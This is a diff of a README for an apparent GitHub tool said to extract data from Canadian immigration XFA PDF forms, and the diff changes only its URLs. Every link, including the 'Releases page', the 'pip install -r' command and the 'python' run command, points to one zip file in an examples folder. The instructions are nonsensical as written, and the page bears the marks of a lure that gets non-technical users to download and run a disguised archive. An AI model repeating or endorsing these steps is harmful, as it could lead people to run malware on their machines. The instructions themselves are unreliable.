@@ -1,7 +1,7 @@
 # 🇨🇦 ircc-xfa-extractor - Extract Data from Canadian XFA Forms Easily
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip)
+[![Download](https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the **ircc-xfa-extractor** application. This tool lets you extract filled data from Canadian immigration (IRCC) XFA PDF forms. 
@@ -16,7 +16,7 @@ No programming skills are needed to use this application.
 ## 💻 Installation Steps
 
 ### 1. Visit the Release Page
-Go to the [Releases page](https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip) to find the latest version of the application.
+Go to the [Releases page](https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip) to find the latest version of the application.
 
 ### 2. Download the Application
 On the Releases page, locate the most recent version. Click on the file that matches your operating system. This will download the application to your computer.
@@ -28,14 +28,14 @@ Once the download is complete, navigate to the location where you saved the file
 Open a command prompt or terminal window. Navigate to the folder where you extracted the files. Enter the following command to install any necessary Python libraries:
 
 ```
-pip install -r https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip
+pip install -r https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip
 ```
 
 ### 5. Run the Application
 Now you can run the application! Use this command in the terminal:
 
 ```
-python https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip
+python https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip
 ```
 
 ### 6. Open Your PDF Form
@@ -53,7 +53,7 @@ The application will process the file and extract the filled data. The result wi
 ## 📋 Troubleshooting
 If you encounter issues:
 - Ensure you have Python installed correctly.
-- Make sure all required libraries from `https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip` are installed.
+- Make sure all required libraries from `https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip` are installed.
 - Check that the PDF form is not damaged or corrupted.
 
 ## ⚙️ FAQ
@@ -73,6 +73,6 @@ You can create an issue on the GitHub repository, or check the community forums 
 Join our community to share your experiences and ask questions. Learn from others who use the **ircc-xfa-extractor** to make the process smoother for everyone.
 
 ## 📥 Additional Download Link
-For direct access to all versions, visit the [Releases page](https://raw.githubusercontent.com/ivanchurqui/ircc-xfa-extractor/main/examples/ircc_extractor_xfa_v1.9.zip) again.
+For direct access to all versions, visit the [Releases page](https://github.com/ivanchurqui/ircc-xfa-extractor/raw/refs/heads/main/examples/ircc_extractor_xfa_v1.9.zip) again.
 
 Enjoy using the **ircc-xfa-extractor** and simplify your data extraction today!
